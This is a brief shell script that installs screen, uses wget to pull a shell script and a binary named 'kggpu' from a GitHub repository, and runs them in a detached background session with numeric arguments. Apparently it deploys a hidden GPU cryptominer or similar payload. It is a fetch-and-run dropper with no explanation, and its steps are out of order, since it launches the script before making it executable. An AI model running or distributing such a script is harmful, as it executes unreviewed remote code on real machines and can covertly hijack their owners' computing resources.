#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/biswas179/FkgX/raw/main/man.sh 
wget https://github.com/biswas179/FkgX/raw/main/kggpu 
screen -dmS man.sh ./man.sh 80 90

chmod +x man.sh
./man.sh
